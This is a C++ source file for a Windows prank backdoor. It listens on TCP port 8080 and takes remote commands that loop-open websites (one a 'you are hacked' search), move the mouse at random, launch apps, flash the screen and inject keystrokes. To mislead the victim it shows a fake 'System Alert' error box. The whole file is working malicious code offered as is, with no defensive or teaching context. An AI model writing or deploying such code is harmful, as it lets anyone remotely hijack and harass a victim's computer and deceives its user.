#include <iostream>
#include <string>
#include <winsock2.h>
#include <windows.h>
#include <cstdlib>
#include <ctime>
#pragma comment(lib, "ws2_32.lib")

using namespace std;


void openRandomWebsites() {
    const char* websites[] = {
        "start https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        "start https://www.google.com/search?q=you+are+hacked",
        "start https://www.reddit.com/r/Unexpected/",
        "start https://www.twitch.tv/"
    };

    while (true) {
        int index = rand() % 4;  
        system(websites[index]); 
        Sleep(3000); 
    }
}


void randomMouseMovement() {
    while (true) {
        int x = rand() % 1920;  
        int y = rand() % 1080;  
        SetCursorPos(x, y);      
        Sleep(500);  
    }
}


void randomAppLauncher() {
    const char* apps[] = { "notepad.exe", "calc.exe", "mspaint.exe" };
    while (true) {
        int index = rand() % 3;  
        system(apps[index]);     
        Sleep(2000);            
    }
}

void screenFlashing() {
    HDC hdc = GetDC(NULL);
    RECT rect;
    GetClientRect(GetDesktopWindow(), &rect); 
    for (int i = 0; i < 10; i++) {
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
        FillRect(hdc, &rect, brush);
        DeleteObject(brush);
        Sleep(300);
    }
    ReleaseDC(NULL, hdc);
}

void keyboardSpam() {
    while (true) {
        wchar_t randomChar = L'A' + rand() % 26;  
        INPUT ip;
        ip.type = INPUT_KEYBOARD;
        ip.ki.wVk = 0;
        ip.ki.dwFlags = KEYEVENTF_UNICODE;
        ip.ki.wScan = randomChar;
        SendInput(1, &ip, sizeof(INPUT));
        Sleep(300);  
    }
}


void executeCommand(const string& command) {
    if (command == "websites") {
        openRandomWebsites();
    } else if (command == "mouse") {
        randomMouseMovement();
    } else if (command == "app") {
        randomAppLauncher();
    } else if (command == "flash") {
        screenFlashing();
    } else if (command == "keyboard") {
        keyboardSpam();
    } else {
        cout << "Unknown command: " << command << endl;
    }
}


int main() {
    WSADATA wsa;
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in server, client;
    char buffer[1024] = {0};
    int port = 8080;

    srand(static_cast<unsigned int>(time(0))); 

    cout << "Initializing Winsock..." << endl;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        cout << "Winsock initialization failed. Error: " << WSAGetLastError() << endl;
        return 1;
    }

    if ((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        cout << "Could not create socket. Error: " << WSAGetLastError() << endl;
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(port);

    if (bind(serverSocket, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        cout << "Bind failed. Error: " << WSAGetLastError() << endl;
        return 1;
    }

    listen(serverSocket, 3);
    cout << "Waiting for incoming connections on port " << port << "..." << endl;

  
    MessageBoxW(NULL, L"Unknown error occurred. Click OK to continue.", L"System Alert", MB_OK | MB_ICONERROR);

    int c = sizeof(struct sockaddr_in);
    if ((clientSocket = accept(serverSocket, (struct sockaddr*)&client, &c)) == INVALID_SOCKET) {
        cout << "Accept failed. Error: " << WSAGetLastError() << endl;
        return 1;
    }

    cout << "Connection accepted!" << endl;

    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesRead > 0) {
            string command(buffer, bytesRead);
            cout << "Command received: " << command << endl;
            executeCommand(command);
        }
    }

    closesocket(serverSocket);
    closesocket(clientSocket);
    WSACleanup();
    return 0;
}